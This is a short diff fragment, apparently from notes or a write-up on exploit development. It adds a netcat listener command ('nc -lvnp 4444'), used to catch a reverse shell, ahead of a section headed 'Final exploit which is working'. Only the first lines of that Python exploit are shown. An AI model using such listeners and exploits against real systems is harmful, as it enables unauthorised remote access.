@@ -2281,6 +2281,10 @@ except:
 >  Final exploit which is working:
 
 ``` 
+nc -lvnp 4444
+```
+
+``` 
 #!/usr/bin/python3
 
 import sys, socket
